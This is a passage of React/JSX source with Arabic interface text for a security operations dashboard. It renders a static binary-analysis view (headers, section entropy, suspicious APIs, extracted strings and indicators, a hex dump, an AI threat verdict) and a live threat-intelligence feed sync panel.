              <div className="rounded-2xl bg-red-950/30 border border-red-500/40 p-5 flex flex-col sm:flex-row sm:items-center justify-between gap-4 text-red-300">
                <div className="flex items-start gap-3">
                  <AlertOctagon className="w-6 h-6 shrink-0 mt-0.5 text-red-400" />
                  <div className="space-y-1">
                    <div className="text-sm font-bold text-red-200">تشخيص حالة الفحص الثنائي</div>
                    <p className="text-xs leading-relaxed font-mono break-all">{binaryLabError}</p>
                  </div>
                </div>
                {binaryLabStaticResult && (
                  <button
                    onClick={() => void evaluateBinaryLabWithCore(binaryLabStaticResult, binaryLabBufferRef.current || undefined)}
                    className="px-4 py-2 bg-red-500/20 hover:bg-red-500/30 border border-red-400/40 text-red-200 rounded-xl text-xs font-bold shrink-0"
                  >
                    إعادة التقييم عبر Sovereign Core
                  </button>
                )}
              </div>
            )}

            {binaryLabStaticResult && (
              <div className="space-y-6">
                {/* KPI Summary Row */}
                <div className="grid grid-cols-2 lg:grid-cols-5 gap-4">
                  <div className="bg-gray-900 border border-gray-800 rounded-2xl p-4 space-y-1">
                    <span className="text-[11px] text-gray-400">الصيغة والترويسة</span>
                    <div className="text-base font-bold text-[#D4AF37] font-mono">{binaryLabStaticResult.format}</div>
                    <div className="text-[10px] text-gray-500 truncate">{binaryLabStaticResult.magicDescription}</div>
                  </div>
                  <div className="bg-gray-900 border border-gray-800 rounded-2xl p-4 space-y-1">
                    <span className="text-[11px] text-gray-400">معدل الإنتروبيا الكلي</span>
                    <div className={`text-2xl font-bold font-mono ${binaryLabStaticResult.overallEntropy >= 7.0 ? 'text-red-400' : 'text-emerald-400'}`}>
                      {binaryLabStaticResult.overallEntropy}
                    </div>
                    <div className="text-[10px] text-gray-500 truncate">{binaryLabStaticResult.entropyClassification}</div>
                  </div>
                  <div className="bg-gray-900 border border-gray-800 rounded-2xl p-4 space-y-1">
                    <span className="text-[11px] text-gray-400">الدوال الخطيرة المكتشفة</span>
                    <div className={`text-2xl font-bold font-mono ${binaryLabStaticResult.suspiciousApis.length > 0 ? 'text-red-400' : 'text-emerald-400'}`}>
                      {binaryLabStaticResult.suspiciousApis.length}
                    </div>
                    <div className="text-[10px] text-gray-500">
                      مكتبات DLL/SO: {binaryLabStaticResult.detectedDlls.length}
                    </div>
                  </div>
                  <div className="bg-gray-900 border border-gray-800 rounded-2xl p-4 space-y-1">
                    <span className="text-[11px] text-gray-400">النصوص والمؤشرات</span>
                    <div className="text-2xl font-bold font-mono text-white">{binaryLabStaticResult.totalStringsCount}</div>
                    <div className="text-[10px] text-gray-500">
                      روابط: {binaryLabStaticResult.extractedUrls.length} • IPs: {binaryLabStaticResult.extractedIps.length}
                    </div>
                  </div>
                  <div className="bg-gray-900 border border-gray-800 rounded-2xl p-4 space-y-1">
                    <span className="text-[11px] text-gray-400">حكم Sovereign Core الجنائي</span>
                    <div className={`text-sm font-bold ${binaryLabAiReport?.isMalicious ? 'text-red-400' : 'text-emerald-400'}`}>
                      {binaryLabAiReport ? `${binaryLabAiReport.riskLevel} (${binaryLabAiReport.threatScore}/100)` : 'بانتظار النتيجة'}
                    </div>
                    <div className="text-[10px] text-gray-500 truncate">
                      {binaryLabAiReport?.threatClassification || binaryLabStaticResult.sha256.substring(0, 12) + '...'}
                    </div>
                  </div>
                </div>

                {/* Sovereign Binary Telemetry Verdict Card */}
                {binaryLabAiReport && (
                  <div
                    className={`rounded-2xl border p-6 space-y-5 shadow-2xl ${
                      binaryLabAiReport.isMalicious || binaryLabAiReport.riskLevel === 'حرج' || binaryLabAiReport.riskLevel === 'مرتفع'
                        ? 'bg-gradient-to-br from-gray-900 via-gray-900 to-red-950/30 border-red-500/40'
                        : 'bg-gradient-to-br from-gray-900 via-gray-900 to-emerald-950/20 border-emerald-500/30'
                    }`}
                  >
                    <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-gray-800">
                      <div className="flex items-center gap-3">
                        <div
                          className={`w-12 h-12 rounded-xl flex items-center justify-center border ${
                            binaryLabAiReport.isMalicious
                              ? 'bg-red-500/15 border-red-500/40 text-red-400'
                              : 'bg-emerald-500/15 border-emerald-500/40 text-emerald-400'
                          }`}
                        >
                          {binaryLabAiReport.isMalicious ? <ShieldAlert className="w-6 h-6" /> : <ShieldCheck className="w-6 h-6" />}
                        </div>
                        <div>
                          <h2 className="text-lg font-bold text-white">
                            {binaryLabAiReport.verdict} — {binaryLabAiReport.threatClassification}
                          </h2>
                          <p className="text-xs text-gray-400 font-mono">
                            Engine: {binaryLabAiReport.modelUsed} • SHA-256: {binaryLabStaticResult.sha256.substring(0, 18)}... • تم تحديث التهديدات وسجلات العمليات
                          </p>
                        </div>
                      </div>
                      <span
                        className={`px-3 py-1.5 rounded-xl text-xs font-bold border self-start md:self-auto ${
                          binaryLabAiReport.isMalicious
                            ? 'bg-red-500/20 text-red-300 border-red-500/40'
                            : 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
                        }`}
                      >
                        الخطورة: {binaryLabAiReport.riskLevel} ({binaryLabAiReport.threatScore}/100)
                      </span>
                    </div>

                    {binaryLabAiReport.mitreTechniques?.length > 0 && (
                      <div className="flex flex-wrap gap-2">
                        {binaryLabAiReport.mitreTechniques.map((t, idx) => (
                          <span key={idx} className="px-2.5 py-1 rounded-lg bg-gray-950 border border-gray-800 text-xs font-mono text-[#D4AF37]">
                            {t}
                          </span>
                        ))}
                      </div>
                    )}

                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2">
                        <div className="text-xs font-bold text-[#D4AF37]">التقييم الجنائي التنفيذي للباينري</div>
                        <p className="text-sm text-gray-200 leading-relaxed whitespace-pre-wrap">{binaryLabAiReport.executiveSummary}</p>
                      </div>
                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2">
                        <div className="text-xs font-bold text-cyan-400">تحليل الترويسة والمقاطع والتعبئة (Packer & Header Analysis)</div>
                        <p className="text-sm text-gray-200 leading-relaxed whitespace-pre-wrap">{binaryLabAiReport.packerOrCompilerAnalysis}</p>
                      </div>
                    </div>

                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2">
                        <div className="text-xs font-bold text-red-400">المؤشرات والأدلة الخطيرة المكتشفة</div>
                        <ul className="space-y-1.5">
                          {binaryLabAiReport.suspiciousFindings.map((f, idx) => (
                            <li key={idx} className="text-xs text-gray-300 bg-gray-900 p-2.5 rounded-lg border border-gray-800">
                              {f}
                            </li>
                          ))}
                        </ul>
                      </div>
                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2">
                        <div className="text-xs font-bold text-emerald-400">التوصيات الأمنية والاستجابة</div>
                        <ul className="space-y-1.5">
                          {binaryLabAiReport.recommendations.map((rec, idx) => (
                            <li key={idx} className="text-xs text-gray-300 bg-gray-900 p-2.5 rounded-lg border border-gray-800 flex items-start gap-2">
                              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 mt-0.5 shrink-0" />
                              <span>{rec}</span>
                            </li>
                          ))}
                        </ul>
                      </div>
                    </div>
                  </div>
                )}

                {/* Technical Inspection Sub-tabs */}
                <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-5">
                  <div className="flex flex-wrap gap-2 pb-4 border-b border-gray-800">
                    <button
                      onClick={() => setBinaryLabSubTab('headers')}
                      className={`px-3.5 py-2 rounded-xl text-xs font-bold transition ${
                        binaryLabSubTab === 'headers' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-950 text-gray-300 border border-gray-800'
                      }`}
                    >
                      الترويسات والمقاطع والإنتروبيا (Headers & Sections)
                    </button>
                    <button
                      onClick={() => setBinaryLabSubTab('apis')}
                      className={`px-3.5 py-2 rounded-xl text-xs font-bold transition ${
                        binaryLabSubTab === 'apis' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-950 text-gray-300 border border-gray-800'
                      }`}
                    >
                      الدوال الخطيرة والمؤشرات الشبكية ({binaryLabStaticResult.suspiciousApis.length})
                    </button>
                    <button
                      onClick={() => setBinaryLabSubTab('strings')}
                      className={`px-3.5 py-2 rounded-xl text-xs font-bold transition ${
                        binaryLabSubTab === 'strings' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-950 text-gray-300 border border-gray-800'
                      }`}
                    >
                      مستخرج النصوص العميق ASCII / UTF-16 ({binaryLabStaticResult.totalStringsCount})
                    </button>
                    <button
                      onClick={() => setBinaryLabSubTab('hex')}
                      className={`px-3.5 py-2 rounded-xl text-xs font-bold transition ${
                        binaryLabSubTab === 'hex' ? 'bg-[#D4AF37] text-gray-950' : 'bg-gray-950 text-gray-300 border border-gray-800'
                      }`}
                    >
                      معاينة Hex & ASCII Dump
                    </button>
                  </div>

                  {binaryLabSubTab === 'headers' && (
                    <div className="space-y-5">
                      {binaryLabStaticResult.peDetails && (
                        <div className="space-y-4">
                          <div className="grid grid-cols-2 md:grid-cols-4 gap-3 text-xs">
                            <div className="bg-gray-950 p-3 rounded-xl border border-gray-800">
                              <span className="text-[10px] text-gray-500 block">المعمارية (Machine)</span>
                              <span className="font-mono font-bold text-[#D4AF37]">{binaryLabStaticResult.peDetails.machine}</span>
                            </div>
                            <div className="bg-gray-950 p-3 rounded-xl border border-gray-800">
                              <span className="text-[10px] text-gray-500 block">النظام الفرعي (Subsystem)</span>
                              <span className="font-mono text-white">{binaryLabStaticResult.peDetails.subsystem}</span>
                            </div>
                            <div className="bg-gray-950 p-3 rounded-xl border border-gray-800">
                              <span className="text-[10px] text-gray-500 block">وقت الترجمة (Compile Timestamp)</span>
                              <span className="font-mono text-gray-300" dir="ltr">{binaryLabStaticResult.peDetails.compileTimestampUtc}</span>
                            </div>
                            <div className="bg-gray-950 p-3 rounded-xl border border-gray-800">
                              <span className="text-[10px] text-gray-500 block">نقطة الدخول / Base</span>
                              <span className="font-mono text-emerald-400" dir="ltr">
                                EP: {binaryLabStaticResult.peDetails.entryPointRva} • {binaryLabStaticResult.peDetails.imageBase}
                              </span>
                            </div>
                          </div>

                          <div className="flex flex-wrap gap-2 text-xs">
                            <span className={`px-2.5 py-1 rounded-lg border font-mono ${binaryLabStaticResult.peDetails.hasAslr ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-300' : 'bg-amber-500/10 border-amber-500/30 text-amber-300'}`}>
                              ASLR: {binaryLabStaticResult.peDetails.hasAslr ? 'مفعل' : 'غير مفعل'}
                            </span>
                            <span className={`px-2.5 py-1 rounded-lg border font-mono ${binaryLabStaticResult.peDetails.hasDepNx ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-300' : 'bg-amber-500/10 border-amber-500/30 text-amber-300'}`}>
                              DEP/NX: {binaryLabStaticResult.peDetails.hasDepNx ? 'مفعل' : 'غير مفعل'}
                            </span>
                            <span className={`px-2.5 py-1 rounded-lg border font-mono ${binaryLabStaticResult.peDetails.hasRwxSection ? 'bg-red-500/20 border-red-500/40 text-red-300 font-bold' : 'bg-gray-950 border-gray-800 text-gray-400'}`}>
                              RWX Sections: {binaryLabStaticResult.peDetails.hasRwxSection ? 'مقطع خطير (Write+Exec)!' : 'لا يوجد'}
                            </span>
                          </div>

                          {binaryLabStaticResult.peDetails.sections.length > 0 && (
                            <div className="overflow-x-auto bg-gray-950 rounded-xl border border-gray-800">
                              <table className="w-full text-right text-xs">
                                <thead className="border-b border-gray-800 text-gray-400">
                                  <tr>
                                    <th className="p-3">المقطع (Section)</th>
                                    <th className="p-3">VirtualAddr</th>
                                    <th className="p-3">VirtualSize</th>
                                    <th className="p-3">RawSize</th>
                                    <th className="p-3">الصلاحيات</th>
                                    <th className="p-3">Entropy</th>
                                    <th className="p-3">التشخيص</th>
                                  </tr>
                                </thead>
                                <tbody className="divide-y divide-gray-800 font-mono" dir="ltr">
                                  {binaryLabStaticResult.peDetails.sections.map((sec, idx) => (
                                    <tr key={idx} className={sec.isPackedAnomaly ? 'bg-red-950/20' : ''}>
                                      <td className="p-3 font-bold text-[#D4AF37]">{sec.name}</td>
                                      <td className="p-3 text-gray-300">{sec.virtualAddress}</td>
                                      <td className="p-3 text-gray-300">{sec.virtualSize.toLocaleString()}</td>
                                      <td className="p-3 text-gray-300">{sec.rawSize.toLocaleString()}</td>
                                      <td className="p-3">
                                        <span className={sec.isExecutable && sec.isWritable ? 'text-red-400 font-bold' : 'text-gray-300'}>
                                          {sec.isReadable ? 'R' : '-'}{sec.isWritable ? 'W' : '-'}{sec.isExecutable ? 'X' : '-'}
                                        </span>
                                      </td>
                                      <td className={`p-3 font-bold ${sec.entropy >= 7.0 ? 'text-red-400' : 'text-emerald-400'}`}>
                                        {sec.entropy}
                                      </td>
                                      <td className="p-3 font-sans">
                                        {sec.isPackedAnomaly ? (
                                          <span className="px-2 py-0.5 rounded bg-red-500/20 text-red-300 text-[10px] font-bold">
                                            شذوذ / تعبئة (Anomaly)
                                          </span>
                                        ) : (
                                          <span className="text-[10px] text-gray-500">قياسي</span>
                                        )}
                                      </td>
                                    </tr>
                                  ))}
                                </tbody>
                              </table>
                            </div>
                          )}
                        </div>
                      )}

                      {binaryLabStaticResult.elfDetails && (
                        <div className="grid grid-cols-2 md:grid-cols-3 gap-3 text-xs">
                          <div className="bg-gray-950 p-3 rounded-xl border border-gray-800">
                            <span className="text-[10px] text-gray-500 block">فئة ELF / Endianness</span>
                            <span className="font-mono font-bold text-[#D4AF37]">
                              {binaryLabStaticResult.elfDetails.elfClass} • {binaryLabStaticResult.elfDetails.endianness}
                            </span>
                          </div>
                          <div className="bg-gray-950 p-3 rounded-xl border border-gray-800">
                            <span className="text-[10px] text-gray-500 block">النوع والمعمارية</span>
                            <span className="font-mono text-white">
                              {binaryLabStaticResult.elfDetails.elfType} • {binaryLabStaticResult.elfDetails.machine}
                            </span>
                          </div>
                          <div className="bg-gray-950 p-3 rounded-xl border border-gray-800">
                            <span className="text-[10px] text-gray-500 block">نقطة الدخول والمقاطع</span>
                            <span className="font-mono text-emerald-400" dir="ltr">
                              EP: {binaryLabStaticResult.elfDetails.entryPoint} • PH:{binaryLabStaticResult.elfDetails.programHeaderCount} SH:{binaryLabStaticResult.elfDetails.sectionHeaderCount}
                            </span>
                          </div>
                        </div>
                      )}

                      {/* Sliding Window Entropy Map */}
                      <div className="bg-gray-950 border border-gray-800 rounded-xl p-4 space-y-3">
                        <div className="text-xs font-bold text-white">خريطة توزيع الإنتروبيا عبر إزاحات الملف (Byte Offset Entropy Profile)</div>
                        <div className="grid grid-cols-4 sm:grid-cols-8 md:grid-cols-16 gap-1.5">
                          {binaryLabStaticResult.entropyWindows.map((win, idx) => (
                            <div
                              key={idx}
                              title={`Offset ${win.offsetStart}-${win.offsetEnd}: Entropy ${win.entropy}`}
                              className="bg-gray-900 border border-gray-800 rounded p-2 text-center space-y-1"
                            >
                              <div className="h-12 flex items-end justify-center">
                                <div
                                  className={`w-full rounded-t ${
                                    win.entropy >= 7.0 ? 'bg-red-500' : win.entropy >= 5.5 ? 'bg-amber-400' : 'bg-emerald-500'
                                  }`}
                                  style={{ height: `${Math.max(10, Math.min(100, (win.entropy / 8) * 100))}%` }}
                                />
                              </div>
                              <div className="text-[10px] font-mono text-gray-300">{win.entropy}</div>
                            </div>
                          ))}
                        </div>
                      </div>
                    </div>
                  )}

                  {binaryLabSubTab === 'apis' && (
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                      <div className="bg-gray-950 border border-gray-800 rounded-xl p-4 space-y-3">
                        <div className="text-xs font-bold text-red-400">الدوال الخطيرة والمشبوهة (Suspicious Win32 / POSIX APIs)</div>
                        {binaryLabStaticResult.suspiciousApis.length === 0 ? (
                          <div className="text-xs text-gray-500">لم تُرصد توقيعات دوال حقن أو تحكم خطيرة معروفة داخل البايتات.</div>
                        ) : (
                          <div className="space-y-2">
                            {binaryLabStaticResult.suspiciousApis.map((api, idx) => (
                              <div key={idx} className="p-2.5 bg-gray-900 border border-gray-800 rounded-lg flex items-center justify-between gap-2">
                                <div>
                                  <div className="text-xs font-mono font-bold text-white" dir="ltr">{api.api}</div>
                                  <div className="text-[10px] text-gray-400">{api.category}</div>
                                </div>
                                <span
                                  className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase ${
                                    api.severity === 'critical'
                                      ? 'bg-red-500/20 text-red-300'
                                      : api.severity === 'high'
                                      ? 'bg-amber-500/20 text-amber-300'
                                      : 'bg-blue-500/20 text-blue-300'
                                  }`}
                                >
                                  {api.severity}
                                </span>
                              </div>
                            ))}
                          </div>
                        )}

                        {binaryLabStaticResult.detectedDlls.length > 0 && (
                          <div className="pt-2 space-y-2">
                            <div className="text-xs font-bold text-[#D4AF37]">المكتبات المرتبطة (DLL / SO / Dylib)</div>
                            <div className="flex flex-wrap gap-1.5" dir="ltr">
                              {binaryLabStaticResult.detectedDlls.map((dll, idx) => (
                                <span key={idx} className="px-2 py-0.5 rounded bg-gray-900 border border-gray-800 text-[11px] font-mono text-gray-300">
                                  {dll}
                                </span>
                              ))}
                            </div>
                          </div>
                        )}
                      </div>

                      <div className="bg-gray-950 border border-gray-800 rounded-xl p-4 space-y-3">
                        <div className="text-xs font-bold text-[#D4AF37]">الروابط وعناوين IP ومسارات التسجيل المستخرجة</div>
                        <div className="space-y-2">
                          {binaryLabStaticResult.extractedUrls.map((u, idx) => (
                            <div key={`u-${idx}`} className="p-2 bg-gray-900 border border-gray-800 rounded-lg flex items-center justify-between gap-2">
                              <span className="text-xs font-mono text-red-300 truncate" dir="ltr">{u}</span>
                              <button
                                onClick={() => {
                                  try {
                                    const host = new URL(u).hostname;
                                    setActiveTab('threat_intel');
                                    void runThreatIntelLookup(host);
                                  } catch {
                                    // ignore invalid URL
                                  }
                                }}
                                className="px-2 py-0.5 rounded bg-[#D4AF37]/15 text-[#D4AF37] text-[10px] font-bold shrink-0"
                              >
                                فحص OSINT
                              </button>
                            </div>
                          ))}
                          {binaryLabStaticResult.extractedIps.map((ip, idx) => (
                            <div key={`ip-${idx}`} className="p-2 bg-gray-900 border border-gray-800 rounded-lg flex items-center justify-between gap-2">
                              <span className="text-xs font-mono text-emerald-300" dir="ltr">{ip}</span>
                              <button
                                onClick={() => {
                                  setActiveTab('threat_intel');
                                  void runThreatIntelLookup(ip);
                                }}
                                className="px-2 py-0.5 rounded bg-[#D4AF37]/15 text-[#D4AF37] text-[10px] font-bold shrink-0"
                              >
                                فحص IP عالمياً
                              </button>
                            </div>
                          ))}
                          {binaryLabStaticResult.registryAndPaths.map((rp, idx) => (
                            <div key={`rp-${idx}`} className="p-2 bg-gray-900 border border-gray-800 rounded-lg text-[11px] font-mono text-amber-300 break-all" dir="ltr">
                              {rp}
                            </div>
                          ))}
                          {binaryLabStaticResult.extractedUrls.length === 0 &&
                            binaryLabStaticResult.extractedIps.length === 0 &&
                            binaryLabStaticResult.registryAndPaths.length === 0 && (
                              <div className="text-xs text-gray-500">لا توجد روابط أو مسارات شبكة مضمنة داخل الملف.</div>
                            )}
                        </div>
                      </div>
                    </div>
                  )}

                  {binaryLabSubTab === 'strings' && (
                    <div className="space-y-3">
                      <input
                        type="text"
                        value={binaryLabStringSearch}
                        onChange={(e) => setBinaryLabStringSearch(e.target.value)}
                        placeholder="ابحث داخل النصوص المستخرجة (ASCII / UTF-16LE)..."
                        className="w-full px-4 py-2.5 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white focus:outline-none focus:border-[#D4AF37]"
                      />
                      <div className="max-h-96 overflow-y-auto bg-gray-950 border border-gray-800 rounded-xl divide-y divide-gray-800">
                        {binaryLabStaticResult.sampleStrings
                          .filter(
                            (s) =>
                              !binaryLabStringSearch.trim() ||
                              s.value.toLowerCase().includes(binaryLabStringSearch.toLowerCase())
                          )
                          .slice(0, 150)
                          .map((str, idx) => (
                            <div key={idx} className="p-2.5 flex items-center justify-between gap-3 text-xs font-mono" dir="ltr">
                              <div className="flex items-center gap-3 min-w-0">
                                <span className="text-gray-500 shrink-0">{str.offsetHex}</span>
                                <span className="px-1.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-[10px] text-[#D4AF37] shrink-0">
                                  {str.encoding}
                                </span>
                                <span className="text-gray-200 truncate">{str.value}</span>
                              </div>
                              <span className="text-[10px] text-gray-400 uppercase shrink-0">{str.category}</span>
                            </div>
                          ))}
                      </div>
                    </div>
                  )}

                  {binaryLabSubTab === 'hex' && (
                    <div className="bg-gray-950 border border-gray-800 rounded-xl p-4 space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-bold text-[#D4AF37]">معاينة الترويسة السداسية العشرية (First 512 Bytes Hex & ASCII)</span>
                        <button
                          onClick={() => copyToClipboard(binaryLabStaticResult.headerHexDump.join('\n'), 'binary-hex-dump')}
                          className="px-2.5 py-1 rounded bg-gray-900 border border-gray-700 text-[11px] text-gray-300 flex items-center gap-1"
                        >
                          <Copy className="w-3 h-3 text-[#D4AF37]" />
                          نسخ Hex Dump
                        </button>
                      </div>
                      <pre className="p-3 bg-gray-900 border border-gray-800 rounded-lg text-[11px] font-mono text-emerald-300 overflow-x-auto leading-relaxed" dir="ltr">
                        {binaryLabStaticResult.headerHexDump.join('\n')}
                      </pre>
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        )}

        {/* Tab: Live Threat Feeds & Automated Sync */}
        {isTabVisible('live_feeds') && (
          <div className="space-y-6">
            <div className="rounded-2xl bg-gradient-to-r from-gray-900 via-gray-900/95 to-gray-950 border-2 border-gray-800 p-8 shadow-2xl space-y-6">
              <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
                <div className="space-y-2 max-w-3xl">
                  <div className="inline-flex items-center gap-2 px-3 py-1 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-mono">
                    <Activity className={`w-3.5 h-3.5 ${liveFeedsAutoSync ? 'animate-pulse' : ''}`} />
                    LIVE THREAT FEEDS & AUTOMATED SYNC • REAL OPEN-SOURCE RSS & JSON APIs
                  </div>
                  <h1 className="text-2xl md:text-3xl font-bold text-white">
                    نظام جلب البيانات والتحديث التلقائي (Live Feeds & Automated Sync)
                  </h1>
                  <p className="text-gray-400 text-sm leading-relaxed">
                    اتصال حي ومجدول آلياً بأهم مصادر استخبارات التهديدات والثغرات الأمنية المفتوحة عالمياً (CISA KEV، CISA Advisories RSS، Abuse.ch Feodo Botnet C2، CIRCL CVE API، SANS ISC، The Hacker News + روابط RSS/API مخصصة)، مع تحديث تلقائي للوحة مؤشرات التهديدات وسجلات العمليات وإصدار موجز استخباراتي عبر Sovereign SOC Correlation Daemon.
                  </p>
                </div>
                <div className="flex flex-wrap items-center gap-2 shrink-0 self-start">
                  <button
                    onClick={() => void syncLiveThreatFeedsNow(false)}
                    disabled={liveFeedsSyncing}
                    className="px-4 py-3 bg-gradient-to-r from-[#D4AF37] to-[#b8972e] text-gray-950 font-bold text-xs rounded-xl shadow hover:opacity-95 transition flex items-center gap-2 disabled:opacity-50"
                  >
                    <RefreshCw className={`w-4 h-4 ${liveFeedsSyncing ? 'animate-spin' : ''}`} />
                    {liveFeedsSyncing ? 'جاري المزامنة الحية...' : 'مزامنة فورية الآن'}
                  </button>
                  <button
                    onClick={() => void generateLiveFeedsSocBriefing()}
                    disabled={liveFeedsBriefingLoading || !liveFeedsResult?.items?.length}
                    className="px-4 py-3 bg-gray-800 hover:bg-gray-700 border border-[#D4AF37]/40 text-[#D4AF37] font-bold text-xs rounded-xl transition flex items-center gap-2 disabled:opacity-50"
                  >
                    {liveFeedsBriefingLoading ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Sparkles className="w-4 h-4" />}
                    تقرير SOC للمخاطر الحية
                  </button>
                  {liveFeedsResult && (
                    <button
                      onClick={downloadLiveFeedsJson}
                      className="px-4 py-3 bg-gray-800 hover:bg-gray-700 text-gray-200 text-xs font-bold rounded-xl border border-gray-700 transition flex items-center gap-2"
                    >
                      <Download className="w-4 h-4 text-[#D4AF37]" />
                      تصدير JSON
                    </button>
                  )}
                </div>
              </div>

              {/* Automated Sync Scheduler Controls */}
              <div className="grid grid-cols-1 md:grid-cols-4 gap-4 p-4 rounded-2xl bg-gray-950 border border-gray-800">
                <div className="flex items-center justify-between gap-3 p-3 rounded-xl bg-gray-900 border border-gray-800">
                  <div>
                    <div className="text-xs font-bold text-white">المزامنة التلقائية (Auto-Sync)</div>
                    <div className="text-[11px] text-gray-400">
                      {liveFeedsAutoSync
                        ? `التحديث القادم خلال ${Math.floor(liveFeedsCountdownSec / 60)}:${String(liveFeedsCountdownSec % 60).padStart(2, '0')}`
                        : 'متوقفة حالياً'}
                    </div>
                  </div>
                  <button
                    onClick={() => setLiveFeedsAutoSync((v) => !v)}
                    className={`px-3 py-1.5 rounded-lg text-xs font-bold transition ${
                      liveFeedsAutoSync
                        ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
                        : 'bg-gray-800 text-gray-400 border border-gray-700'
                    }`}
                  >
                    {liveFeedsAutoSync ? 'مفعّلة ON' : 'متوقفة OFF'}
                  </button>
                </div>

                <div className="p-3 rounded-xl bg-gray-900 border border-gray-800 space-y-1">
                  <label className="text-[11px] text-gray-400 block">فترة التحديث التلقائي (Polling Interval)</label>
                  <select
                    value={liveFeedsIntervalSec}
                    onChange={(e) => setLiveFeedsIntervalSec(Number(e.target.value))}
                    className="w-full bg-gray-950 border border-gray-700 rounded-lg px-2.5 py-1.5 text-xs text-white focus:outline-none focus:border-[#D4AF37]"
                  >
                    <option value={30}>كل 30 ثانية (فائق السرعة)</option>
                    <option value={60}>كل 1 دقيقة</option>
                    <option value={300}>كل 5 دقائق (موصى به)</option>
                    <option value={900}>كل 15 دقيقة</option>
                    <option value={1800}>كل 30 دقيقة</option>
                  </select>
                </div>

                <div className="flex items-center justify-between gap-3 p-3 rounded-xl bg-gray-900 border border-gray-800">
                  <div>
                    <div className="text-xs font-bold text-white">تحديث التهديدات والسجل آلياً</div>
                    <div className="text-[11px] text-gray-400">تسجيل الثغرات الحرجة الجديدة تلقائياً</div>
                  </div>
                  <button
                    onClick={() => setLiveFeedsAutoEscalate((v) => !v)}
                    className={`px-3 py-1.5 rounded-lg text-xs font-bold transition ${
                      liveFeedsAutoEscalate
                        ? 'bg-[#D4AF37]/20 text-[#D4AF37] border border-[#D4AF37]/40'
                        : 'bg-gray-800 text-gray-400 border border-gray-700'
                    }`}
                  >
                    {liveFeedsAutoEscalate ? 'تلقائي' : 'يدوي'}
                  </button>
                </div>

                <div className="p-3 rounded-xl bg-gray-900 border border-gray-800 space-y-1">
                  <div className="text-[11px] text-gray-400">آخر مزامنة ناجحة</div>
                  <div className="text-xs font-mono font-bold text-[#D4AF37]">
                    {liveFeedsResult ? formatTimestampSafe(liveFeedsResult.syncedAt) : 'لم تكتمل بعد'}
                  </div>
                  <div className="text-[10px] text-emerald-400">
                    {liveFeedsResult
                      ? `${liveFeedsResult.stats.activeSourcesOk}/${liveFeedsResult.stats.activeSourcesTotal} مصادر متصلة`
                      : 'جاهز للمزامنة'}
                  </div>
                </div>
              </div>
            </div>

            {liveFeedsError && (
              <div className="rounded-2xl bg-red-950/30 border border-red-500/40 p-5 flex items-start gap-3 text-red-300">
                <AlertOctagon className="w-6 h-6 shrink-0 mt-0.5 text-red-400" />
                <div className="space-y-1">
                  <div className="text-sm font-bold text-red-200">تشخيص مزامنة التغذيات الحية</div>
                  <p className="text-xs font-mono break-all">{liveFeedsError}</p>
                </div>
              </div>
            )}

            {/* KPI Summary Bar */}
            {liveFeedsResult && (
              <div className="grid grid-cols-2 lg:grid-cols-5 gap-4">
                <div className="bg-gray-900 border border-gray-800 rounded-2xl p-4 space-y-1">
                  <span className="text-[11px] text-gray-400">إجمالي المؤشرات الحية</span>
                  <div className="text-2xl font-bold font-mono text-white">{liveFeedsResult.stats.totalItems}</div>
                  <div className="text-[10px] text-gray-500">عناصر فريدة محدثة</div>
                </div>
                <div className="bg-gray-900 border border-red-500/30 rounded-2xl p-4 space-y-1">
                  <span className="text-[11px] text-gray-400">تنبيهات حرجة (Critical)</span>
                  <div className="text-2xl font-bold font-mono text-red-400">{liveFeedsResult.stats.criticalCount}</div>
                  <div className="text-[10px] text-gray-500">Zero-Day / Active C2 / Ransomware</div>
                </div>
                <div className="bg-gray-900 border border-gray-800 rounded-2xl p-4 space-y-1">
                  <span className="text-[11px] text-gray-400">ثغرات CVEs المرصودة</span>
                  <div className="text-2xl font-bold font-mono text-[#D4AF37]">{liveFeedsResult.stats.cveCount}</div>
                  <div className="text-[10px] text-gray-500">من CISA KEV وCIRCL</div>
                </div>
                <div className="bg-gray-900 border border-gray-800 rounded-2xl p-4 space-y-1">
                  <span className="text-[11px] text-gray-400">خوادم C2 النشطة</span>
                  <div className="text-2xl font-bold font-mono text-amber-400">{liveFeedsResult.stats.c2Count}</div>
                  <div className="text-[10px] text-gray-500">من Abuse.ch Feodo Tracker</div>
                </div>
                <div className="bg-gray-900 border border-gray-800 rounded-2xl p-4 space-y-1">
                  <span className="text-[11px] text-gray-400">صحة المصادر المفتوحة</span>
                  <div className="text-2xl font-bold font-mono text-emerald-400">
                    {liveFeedsResult.stats.activeSourcesOk}/{liveFeedsResult.stats.activeSourcesTotal}
                  </div>
                  <div className="text-[10px] text-gray-500">اتصال RSS / JSON مباشر</div>
                </div>
              </div>
            )}

            {/* Sovereign SOC Live Feeds Threat Briefing */}
            {liveFeedsBriefing && (
              <div className="rounded-2xl border border-[#D4AF37]/40 bg-gradient-to-br from-gray-900 via-gray-900 to-amber-950/20 p-6 space-y-4 shadow-2xl">
                <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 pb-3 border-b border-gray-800">
                  <div className="flex items-center gap-3">
